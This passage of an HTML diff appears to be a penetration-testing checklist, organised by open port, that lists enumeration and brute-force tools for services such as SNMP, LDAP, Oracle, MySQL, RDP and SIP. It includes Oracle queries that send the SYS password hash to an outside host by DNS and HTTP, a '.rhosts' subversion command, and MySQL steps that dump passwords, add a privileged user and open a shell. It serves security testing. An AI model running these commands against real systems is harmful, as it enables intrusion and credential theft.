+<li><a href="http://packetstormsecurity.org/NT/hack/sid.zip">user2sid/sid2user</a></li>
+<li><a href="http://ntsecurity.nu/toolbox/winfo/">Winfo</a></li>
+</ul>
+</li>
+<li>NetBIOS brute force</li>
+<li style="list-style-type: none"><ul><li><a href="http://freeworld.thc.org/">Hydra</a></li>
+<li><a href="http://www.hoobie.net/brutus/">Brutus</a></li>
+<li><a href="http://www.oxid.it/cain.html">Cain &amp; Abel</a></li>
+<li><a href="http://www.securityfriday.com/tools/GetAcct.html">getacct</a></li>
+<li><a href="http://www.cotse.com/tools/netbios.htm">NAT (NetBIOS Auditing Tool)</a></li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>Smb.conf</li>
+<li>lmhosts</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SNMP port 161 open</li>
+<li style="list-style-type: none"><ul><li>Default Community Strings</li>
+<li style="list-style-type: none"><ul><li>public</li>
+<li>private</li>
+<li>cisco</li>
+<li style="list-style-type: none"><ul><li>cable-docsis</li>
+<li>ILMI</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MIB enumeration</li>
+<li style="list-style-type: none"><ul><li>Windows NT</li>
+<li style="list-style-type: none"><ul><li>.1.3.6.1.2.1.1.5 Hostnames</li>
+<li>.1.3.6.1.4.1.77.1.4.2 Domain Name</li>
+<li>.1.3.6.1.4.1.77.1.2.25 Usernames</li>
+<li>.1.3.6.1.4.1.77.1.2.3.1.1 Running Services</li>
+<li>.1.3.6.1.4.1.77.1.2.27 Share Information</li>
+</ul>
+</li>
+<li><a href="http://www.solarwinds.net/Download-Tools.htm">Solarwinds MIB walk</a></li>
+<li><a href="http://www.wtcs.org/snmp4tpc/getif.htm">Getif</a></li>
+<li>snmpwalk</li>
+<li style="list-style-type: none"><ul><li>snmpwalk -v &lt;Version&gt; -c &lt;Community string&gt; &lt;IP&gt;</li>
+</ul>
+</li>
+<li><a href="http://www.foundstone.com/">Snscan</a></li>
+<li>Applications</li>
+<li style="list-style-type: none"><ul><li>ZyXel</li>
+<li style="list-style-type: none"><ul><li>snmpget -v2c -c &lt;Community String&gt; &lt;IP&gt; 1.3.6.1.4.1.890.1.2.1.2.6.0</li>
+<li>snmpwalk -v2c -c &lt;Community String&gt; &lt;IP&gt; 1.3.6.1.4.1.890.1.2.1.2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SNMP Bruteforce</li>
+<li style="list-style-type: none"><ul><li>onesixtyone</li>
+<li style="list-style-type: none"><ul><li>onesixytone -c SNMP.wordlist &lt;IP&gt;</li>
+</ul>
+</li>
+<li>cat</li>
+<li style="list-style-type: none"><ul><li>./cat -h &lt;IP&gt; -w SNMP.wordlist</li>
+</ul>
+</li>
+<li><a href="http://www.solarwinds.net/Download-Tools.htm">Solarwinds SNMP Brute Force</a></li>
+<li><a href="http://adm.freelsd.net/ADM/">ADMsnmp</a></li>
+</ul>
+</li>
+<li>Examine SNMP Configuration files</li>
+<li style="list-style-type: none"><ul><li>snmp.conf</li>
+<li>snmpd.conf</li>
+<li>snmp-config.xml</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>LDAP Port 389 Open</li>
+<li style="list-style-type: none"><ul><li>ldap enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://sourceforge.net/projects/ldapminer/">ldapminer</a></li>
+<li style="list-style-type: none"><ul><li>ldapminer -h ip_address -p port (not required if default) -d</li>
+</ul>
+</li>
+<li><a href="http://luma.sourceforge.net/">luma</a></li>
+<li style="list-style-type: none"><ul><li>Gui based tool</li>
+</ul>
+</li>
+<li><a href="http://www.microsoft.com/">ldp</a></li>
+<li style="list-style-type: none"><ul><li>Gui based tool</li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/%20http://www.openldap.org/">openldap</a></li>
+<li style="list-style-type: none"><ul><li>ldapsearch [-n] [-u] [-v] [-k] [-K] [-t] [-A] [-L[L[L]]] [-M[M]] [-d debuglevel] [-f file] [-D binddn] [-W] [-w passwd] [-y passwdfile] [-H ldapuri] [-h ldaphost] [-p ldapport] [-P 2|3] [-b searchbase] [-s base|one|sub] [-a never|always|search|find] [-l timelimit] [-z sizelimit] [-O security-properties] [-I] [-U authcid] [-R realm] [-x] [-X authzid] [-Y mech] [-Z[Z]] filter [attrs...]</li>
+<li>ldapadd [-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-h ldaphost][-p ldap-port][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]</li>
+<li>ldapdelete [-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-f file][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-P 2|3][-p ldapport][-O security-properties][-U authcid][-R realm][-x][-I][-Q] [-X authzid][-Y mech][-Z[Z]][dn]</li>
+<li>ldapmodify [-a][-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]</li>
+<li>ldapmodrdn [-r][-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile] [-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x] [-X authzid][-Y mech][-Z[Z]][-f file][dn rdn]</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ldap brute force</li>
+<li style="list-style-type: none"><ul><li><a href="http://examples.oreilly.com/networksa/tools/">bf_ldap</a></li>
+<li style="list-style-type: none"><ul><li>bf_ldap -s server -d domain name -u|-U username | users list file name -L|-l passwords list | length of passwords to generate optional: -p port (default 389) -v (verbose mode) -P Ldap user path (default ,CN=Users,)</li>
+</ul>
+</li>
+<li><a href="http://www.indianz.ch/">K0ldS</a></li>
+<li><a href="http://www.securiteam.com/tools/6F00D0U3GK.html">LDAP_Brute.pl</a></li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>General</li>
+<li style="list-style-type: none"><ul><li>containers.ldif</li>
+<li>ldap.cfg</li>
+<li>ldap.conf</li>
+<li>ldap.xml</li>
+<li>ldap-config.xml</li>
+<li>ldap-realm.xml</li>
+<li>slapd.conf</li>
+</ul>
+</li>
+<li>IBM SecureWay V3 server</li>
+<li style="list-style-type: none"><ul><li>V3.sas.oc</li>
+</ul>
+</li>
+<li>Microsoft Active Directory server</li>
+<li style="list-style-type: none"><ul><li>msadClassesAttrs.ldif</li>
+</ul>
+</li>
+<li>Netscape Directory Server 4</li>
+<li style="list-style-type: none"><ul><li>nsslapd.sas_at.conf</li>
+<li>nsslapd.sas_oc.conf</li>
+</ul>
+</li>
+<li>OpenLDAP directory server</li>
+<li style="list-style-type: none"><ul><li>slapd.sas_at.conf</li>
+<li>slapd.sas_oc.conf</li>
+</ul>
+</li>
+<li>Sun ONE Directory Server 5.1</li>
+<li style="list-style-type: none"><ul><li>75sas.ldif</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PPTP/L2TP/VPN port 500/1723 open</li>
+<li style="list-style-type: none"><ul><li>Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.nta-monitor.com/ike-scan/">ike-scan</a></li>
+<li><a href="http://www.ernw.de/download/ikeprobe.zip">ike-probe</a></li>
+</ul>
+</li>
+<li>Brute-Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://ikecrack.sourceforge.net/">ike-crack</a></li>
+</ul>
+</li>
+<li>Reference Material</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.ernw.de/download/pskattack.pdf">PSK cracking paper</a></li>
+<li><a href="http://www.securityfocus.com/infocus/1821">SecurityFocus Infocus</a></li>
+<li><a href="http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf">Scanning a VPN Implementation</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Modbus port 502 open</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.packetstormsecurity.org/UNIX/scanners/modscan.py.txt">modscan</a></li>
+</ul>
+</li>
+<li>rlogin port 513 open</li>
+<li style="list-style-type: none"><ul><li>Rlogin Enumeration</li>
+<li style="list-style-type: none"><ul><li>Find the files</li>
+<li style="list-style-type: none"><ul><li>find / -name .rhosts</li>
+<li>locate .rhosts</li>
+</ul>
+</li>
+<li>Examine Files</li>
+<li style="list-style-type: none"><ul><li>cat .rhosts</li>
+</ul>
+</li>
+<li>Manual Login</li>
+<li style="list-style-type: none"><ul><li>rlogin hostname -l username</li>
+<li>rlogin &lt;IP&gt;</li>
+</ul>
+</li>
+<li>Subvert the files</li>
+<li style="list-style-type: none"><ul><li>echo ++ &gt; .rhosts</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Rlogin Brute force</li>
+<li style="list-style-type: none"><ul><li><a href="http://freeworld.thc.org/">Hydra</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>rsh port 514 open</li>
+<li style="list-style-type: none"><ul><li>Rsh Enumeration</li>
+<li style="list-style-type: none"><ul><li>rsh host [-l username] [-n] [-d] [-k realm] [-f | -F] [-x] [-PN | -PO] command</li>
+</ul>
+</li>
+<li>Rsh Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://pentestmonkey.net/tools/rsh-grind/">rsh-grind</a></li>
+<li><a href="http://freeworld.thc.org/">Hydra</a></li>
+<li><a href="http://www.foofus.net/jmk/medusa/">medusa</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SQL Server Port 1433 1434 open</li>
+<li style="list-style-type: none"><ul><li>SQL Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.cqure.net/wp/?page_id=33">piggy</a></li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLPing</a></li>
+<li style="list-style-type: none"><ul><li>sqlping ip_address/hostname</li>
+</ul>
+</li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLPing2</a></li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLPing3</a></li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLpoke</a></li>
+<li><a href="http://www.specialopssecurity.com/labs/sqlrecon/1.0/down.php">SQL Recon</a></li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLver</a></li>
+</ul>
+</li>
+<li>SQL Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.cqure.net/wp/?page_id=16">SQLPAT</a></li>
+<li style="list-style-type: none"><ul><li>sqlbf -u hashes.txt -d dictionary.dic -r out.rep - Dictionary Attack</li>
+<li>sqlbf -u hashes.txt -c default.cm -r out.rep - Brute-Force Attack</li>
+</ul>
+</li>
+<li><a href="http://ntsecurity.nu/toolbox/sqldict/">SQL Dict</a></li>
+<li><a href="http://www.cqure.net/wp/?page_id=6">SQLAT</a></li>
+<li><a href="http://freeworld.thc.org/">Hydra</a></li>
+<li><a href="http://www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx">SQLlhf</a></li>
+<li><a href="http://www.securityfocus.com/tools/3021">ForceSQL</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Citrix port 1494 open</li>
+<li style="list-style-type: none"><ul><li>Citrix Enumeration</li>
+<li style="list-style-type: none"><ul><li>Default Domain</li>
+<li>Published Applications</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.cqure.net/tools/citrix_pa.zip">./citrix-pa-scan {IP_address/file | - | random} [timeout]</a></li>
+<li><a href="http://www.cqure.net/tools/citrix_pa.zip">citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Citrix Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://code.google.com/p/gobag/source/browse/trunk/citrix/bforce.js?r=2">bforce.js</a></li>
+<li><a href="http://www.gnucitizen.org/static/blog/2007/10/connect.js">connect.js</a></li>
+<li><a href="http://sh0dan.org/oldfiles/citrix-pab/">Citrix Brute-forcer</a></li>
+<li>Reference Material</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.gnucitizen.org/blog/citrix-owning-the-legitimate-backdoor/">Hacking Citrix - the legitimate backdoor</a></li>
+<li><a href="http://www.gnucitizen.org/blog/hacking-citrix-the-forceful-way/">Hacking Citrix - the forceful way</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Oracle Port 1521 Open</li>
+<li style="list-style-type: none"><ul><li>Oracle Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.woany.co.uk/oracsec/">oracsec</a></li>
+<li><a href="http://www.red-database-security.com/">Repscan</a></li>
+<li><a href="http://www.red-database-security.com/">Sidguess</a></li>
+<li><a href="http://www.imperva.com/products/scuba.html">Scuba</a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/dns_http.htm">DNS/HTTP Enumeration</a></li>
+<li style="list-style-type: none"><ul><li>SQL&gt; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL</li>
+<li></li>
+<li>SQL&gt; select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;</li>
+<li></li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/WinSID.zip">WinSID</a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm">Oracle default password list</a></li>
+<li><a href="http://www.ngssoftware.com/">TNSVer</a></li>
+<li style="list-style-type: none"><ul><li>tnsver host [port]</li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/tcp_scan.htm">TCP Scan</a></li>
+<li><a href="http://www.dokfleed.net/duh/modules.php?name=News&file=article&sid=35">Oracle TNSLSNR</a></li>
+<li style="list-style-type: none"><ul><li>Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]</li>
+</ul>
+</li>
+<li><a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd">TNSCmd</a></li>
+<li style="list-style-type: none"><ul><li>perl tnscmd.pl -h ip_address</li>
+<li>perl tnscmd.pl version -h ip_address</li>
+<li>perl tnscmd.pl status -h ip_address</li>
+<li>perl tnscmd.pl -h ip_address --cmdsize (40 - 200)</li>
+</ul>
+</li>
+<li><a href="http://www.integrigy.com/security-resources/downloads/lsnrcheck-tool/">LSNrCheck</a></li>
+<li><a href="http://www.ensyncsolutions.com/downloads.html">Oracle Security Check (needs credentials)</a></li>
+<li><a href="http://www.cqure.net/wp/">OAT</a></li>
+<li style="list-style-type: none"><ul><li>sh opwg.sh -s ip_address</li>
+<li>opwg.bat -s ip_address</li>
+<li>sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID</li>
+</ul>
+</li>
+<li><a href="http://www.cqure.net/wp/">OScanner</a></li>
+<li style="list-style-type: none"><ul><li>sh oscanner.sh -s ip_address</li>
+<li>oscanner.exe -s ip_address</li>
+<li>sh reportviewer.sh oscanner_saved_file.xml</li>
+<li>reportviewer.exe oscanner_saved_file.xml</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/squirrelora.htm">NGS Squirrel for Oracle</a></li>
+<li><a href="http://www.ngssoftware.com/">Service Register</a></li>
+<li style="list-style-type: none"><ul><li>Service-register.exe ip_address</li>
+</ul>
+</li>
+<li><a href="http://www.red-database-security.com/software/plsqlscanner.html">PLSQL Scanner 2008</a></li>
+</ul>
+</li>
+<li>Oracle Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.databasesecurity.com/dbsec/OAK.zip">OAK</a></li>
+<li style="list-style-type: none"><ul><li>ora-getsid hostname port sid_dictionary_list</li>
+<li>ora-auth-alter-session host port sid username password sql</li>
+<li>ora-brutesid host port start</li>
+<li>ora-pwdbrute host port sid username password-file</li>
+<li>ora-userenum host port sid userlistfile</li>
+<li>ora-ver -e (-f -l -a) host port</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/">breakable (Targets Application Server Port)</a></li>
+<li style="list-style-type: none"><ul><li>breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/">SQLInjector (Targets Application Server Port)</a></li>
+<li style="list-style-type: none"><ul><li>sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL</li>
+<li>sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle</li>
+</ul>
+</li>
+<li><a href="http://www.red-database-security.com/">Check Password</a></li>
+<li><a href="http://www.toolcrypt.org/index.html">orabf</a></li>
+<li style="list-style-type: none"><ul><li>orabf [hash]:[username] [options]</li>
+</ul>
+</li>
+<li><a href="http://freeworld.thc.org/thc-orakel/">thc-orakel</a></li>
+<li style="list-style-type: none"><ul><li>Cracker</li>
+<li>Client</li>
+<li>Crypto</li>
+</ul>
+</li>
+<li><a href="http://www.codework.com/dbvis/product.html">DBVisualisor</a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.pentest.co.uk/">Sql scripts from pentest.co.uk</a></li>
+<li>Manual sql input of previously reported vulnerabilties</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Oracle Reference Material</li>
+<li style="list-style-type: none"><ul><li><a href="http://infys.net/papers/Sql_Injection.pdf#search=%22hardik%20shah%20sql%20injection%22">Understanding SQL Injection</a></li>
+<li><a href="http://www.securiteam.com/securityreviews/5DP0N1P76E.html">SQL Injection walkthrough</a></li>
+<li><a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html">SQL Injection by example</a></li>
+<li><a href="http://security-papers.globint.com.ar/oracle_security/sql_injection_in_oracle.php">Advanced SQL Injection in Oracle databases</a></li>
+<li><a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html">Blind SQL Injection</a></li>
+<li>SQL Cheatsheets</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>http://ha.ckers.org/sqlinjection</li>
+<li>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</li>
+<li>http://www.0x000000.com/?i=14</li>
+<li>http://pentestmonkey.net/ </li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>NFS Port 2049 open</li>
+<li style="list-style-type: none"><ul><li>NFS Enumeration</li>
+<li style="list-style-type: none"><ul><li>showmount -e hostname/ip_address</li>
+<li>mount -t nfs ip_address:/directory_found_exported /local_mount_point</li>
+</ul>
+</li>
+<li>NFS Brute Force</li>
+<li style="list-style-type: none"><ul><li>Interact with NFS share and try to add/delete</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/nfs.htm">Exploit and Confuse Unix</a></li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>/etc/exports</li>
+<li>/etc/lib/nfs/xtab</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Compaq/HP Insight Manager Port 2301,2381open</li>
+<li style="list-style-type: none"><ul><li>HP Enumeration</li>
+<li style="list-style-type: none"><ul><li>Authentication Method</li>
+<li style="list-style-type: none"><ul><li>Host OS Authentication</li>
+<li>Default Authentication</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm">Default Passwords</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.sensepost.com/">Wikto</a></li>
+<li><a href="http://www.nstalker.com/eng/products/nstealth/">Nstealth</a></li>
+</ul>
+</li>
+<li>HP Bruteforce</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.thc.org/releases.php">Hydra</a></li>
+<li><a href="http://www.acunetix.com/">Acunetix</a></li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>path.properties</li>
+<li>mx.log</li>
+<li>CLIClientConfig.cfg</li>
+<li>database.props</li>
+<li>pg_hba.conf</li>
+<li>jboss-service.xml</li>
+<li>.namazurc</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MySQL port 3306 open</li>
+<li style="list-style-type: none"><ul><li>Enumeration</li>
+<li style="list-style-type: none"><ul><li>nmap -A -n -p3306 &lt;IP Address&gt;</li>
+<li>nmap -A -n -PN --script:ALL -p3306 &lt;IP Address&gt;</li>
+<li>telnet IP_Address 3306</li>
+<li>use test; select * from test;</li>
+<li>To check for other DB's -- show databases</li>
+</ul>
+</li>
+<li>Administration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.securiteam.com/tools/6Y00L0U5PC.html">MySQL Network Scanner</a></li>
+<li><a href="http://dev.mysql.com/downloads/gui-tools/5.0.html">MySQL GUI Tools</a></li>
+<li>mysqlshow</li>
+<li>mysqlbinlog</li>
+</ul>
+</li>
+<li>Manual Checks</li>
+<li style="list-style-type: none"><ul><li>Default usernames and passwords</li>
+<li style="list-style-type: none"><ul><li>username: root password:</li>
+<li>testing</li>
+<li style="list-style-type: none"><ul><li>mysql -h &lt;Hostname&gt; -u root</li>
+<li>mysql -h &lt;Hostname&gt; -u root</li>
+<li>mysql -h &lt;Hostname&gt; -u root@localhost</li>
+<li>mysql -h &lt;Hostname&gt;</li>
+<li>mysql -h &lt;Hostname&gt; -u ""@localhost</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Configuration Files</li>
+<li style="list-style-type: none"><ul><li>Operating System</li>
+<li style="list-style-type: none"><ul><li>windows</li>
+<li style="list-style-type: none"><ul><li>config.ini</li>
+<li>my.ini</li>
+<li style="list-style-type: none"><ul><li>windows\my.ini</li>
+<li>winnt\my.ini</li>
+</ul>
+</li>
+<li>&lt;InstDir&gt;/mysql/data/</li>
+</ul>
+</li>
+<li>unix</li>
+<li style="list-style-type: none"><ul><li>my.cnf</li>
+<li style="list-style-type: none"><ul><li>/etc/my.cnf</li>
+<li>/etc/mysql/my.cnf</li>
+<li>/var/lib/mysql/my.cnf</li>
+<li>~/.my.cnf</li>
+<li>/etc/my.cnf</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Command History</li>
+<li style="list-style-type: none"><ul><li>~/.mysql.history</li>
+</ul>
+</li>
+<li>Log Files</li>
+<li style="list-style-type: none"><ul><li>connections.log</li>
+<li>update.log</li>
+<li>common.log</li>
+</ul>
+</li>
+<li>To run many sql commands at once -- mysql -u username -p &lt; manycommands.sql</li>
+<li>MySQL data directory (Location specified in my.cnf)</li>
+<li style="list-style-type: none"><ul><li>Parent dir = data directory</li>
+<li>mysql</li>
+<li>test</li>
+<li>information_schema (Key information in MySQL)</li>
+<li style="list-style-type: none"><ul><li>Complete table list -- select table_schema,table_name from tables;</li>
+<li>Exact privileges -- select grantee, table_schema, privilege_type FROM schema_privileges;</li>
+<li>File privileges -- select user,file_priv from mysql.user where user='root';</li>
+<li>Version -- select version();</li>
+<li>Load a specific file -- SELECT LOAD_FILE('FILENAME');</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSL Check</li>
+<li style="list-style-type: none"><ul><li>mysql&gt; show variables like 'have_openssl';</li>
+<li style="list-style-type: none"><ul><li>If there's no rows returned at all it means the the distro itself doesn't support SSL connections and probably needs to be recompiled. If its disabled it means that the service just wasn't started with ssl and can be easily fixed.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Privilege Escalation</li>
+<li style="list-style-type: none"><ul><li>Current Level of access</li>
+<li style="list-style-type: none"><ul><li>mysql&gt;select user();</li>
+<li>mysql&gt;select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';</li>
+</ul>
+</li>
+<li>Access passwords</li>
+<li style="list-style-type: none"><ul><li>mysql&gt; use mysql</li>
+<li>mysql&gt; select user,password from user;</li>
+</ul>
+</li>
+<li>Create a new user and grant him privileges</li>
+<li style="list-style-type: none"><ul><li>mysql&gt;create user test identified by 'test';</li>
+<li>mysql&gt; grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;</li>
+</ul>
+</li>
+<li>Break into a shell</li>
+<li style="list-style-type: none"><ul><li>mysql&gt; \! cat /etc/passwd</li>
+<li>mysql&gt; \! bash</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SQL injection</li>
+<li style="list-style-type: none"><ul><li><a href="http://packetstormsecurity.org/UNIX/audit/mysql-miner.pl">mysql-miner.pl</a></li>
+<li style="list-style-type: none"><ul><li>mysql-miner.pl http://target/ expected_string database</li>
+</ul>
+</li>
+<li>http://www.imperva.com/resources/adc/sql_injection_signatures_evasion.html</li>
+<li>http://www.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/</li>
+</ul>
+</li>
+<li>References.</li>
+<li style="list-style-type: none"><ul><li>Design Weaknesses</li>
+<li style="list-style-type: none"><ul><li>MySQL running as root</li>
+<li>Exposed publicly on Internet</li>
+</ul>
+</li>
+<li>http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=mysql</li>
+<li>http://search.securityfocus.com/swsearch?sbm=%2F&amp;metaname=alldoc&amp;query=mysql&amp;x=0&amp;y=0</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>RDesktop port 3389 open</li>
+<li style="list-style-type: none"><ul><li>Rdesktop Enumeration</li>
+<li style="list-style-type: none"><ul><li>Remote Desktop Connection</li>
+</ul>
+</li>
+<li>Rdestop Bruteforce</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.hammerofgod.com/download.html">TSGrinder</a></li>
+<li style="list-style-type: none"><ul><li>tsgrinder.exe -w dictionary_file -l leet -d workgroup -u administrator -b -n 2 IP_Address</li>
+</ul>
+</li>
+<li><a href="http://web.archive.org/web/20030405132642/bogonel.mirror.spacebitch.com/">Tscrack</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Sybase Port 5000+ open</li>
+<li style="list-style-type: none"><ul><li>Sybase Enumeration</li>
+<li style="list-style-type: none"><ul><li>sybase-version ip_address from NGS</li>
+</ul>
+</li>
+<li>Sybase Vulnerability Assessment</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.codework.com/dbvis/product.html">Use DBVisualiser</a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.windowsecurity.com/whitepaper/Guide_to_Sybase_Security.html">Sybase Security checksheet</a></li>
+<li style="list-style-type: none"><ul><li>Copy output into excel spreadsheet</li>
+<li>Evaluate mis-configured parameters</li>
+</ul>
+</li>
+<li>Manual sql input of previously reported vulnerabilties</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection in SQL Server</a></li>
+<li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/products/database-security/ngs-squirrel-sybase.php">NGS Squirrel for Sybase</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SIP Port 5060 open</li>
+<li style="list-style-type: none"><ul><li>SIP Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://netcat.sourceforge.net/">netcat</a></li>
+<li style="list-style-type: none"><ul><li>nc IP_Address Port</li>
+</ul>
+</li>
+<li><a href="http://code.google.com/p/sipflanker/">sipflanker</a></li>
+<li style="list-style-type: none"><ul><li>python sipflanker.py 192.168.1-254</li>
+</ul>
+</li>
+<li><a href="http://www.hackingvoip.com/tools/sipscan.msi">Sipscan</a></li>
+<li>smap</li>
+<li style="list-style-type: none"><ul><li>smap IP_Address/Subnet_Mask</li>
+<li>smap -o IP_Address/Subnet_Mask</li>
+<li>smap -l IP_Address</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SIP Packet Crafting etc.</li>
+<li style="list-style-type: none"><ul><li><a href="http://sipsak.org/">sipsak</a></li>
+<li style="list-style-type: none"><ul><li>Tracing paths: - sipsak -T -s sip:usernaem@domain</li>
+<li>Options request:- sipsak -vv -s sip:username@domain</li>
+<li>Query registered bindings:- sipsak -I -C empty -a password -s sip:username@domain</li>
+</ul>
+</li>
+<li><a href="http://www.hackingvoip.com/tools/sip_rogue.tar.gz">siprogue</a></li>
+</ul>
+</li>
+<li>SIP Vulnerability Scanning/ Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.hackingexposedcisco.com/tools/TFTP-bruteforce.tar.gz">tftp bruteforcer</a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.hackingvoip.com/tools/tftp_bruteforce.txt">Default dictionary file</a></li>
+<li>./tftpbrute.pl IP_Address Dictionary_file Maximum_Processes</li>
+</ul>
+</li>
+<li><a href="http://www.voipshield.com/">VoIPaudit</a></li>
+<li><a href="http://www.vopsecurity.org/">SiVuS</a></li>
+</ul>
+</li>
+<li>Examine Configuration Files</li>
+<li style="list-style-type: none"><ul><li>SIPDefault.cnf</li>
+<li>asterisk.conf</li>
+<li>sip.conf</li>
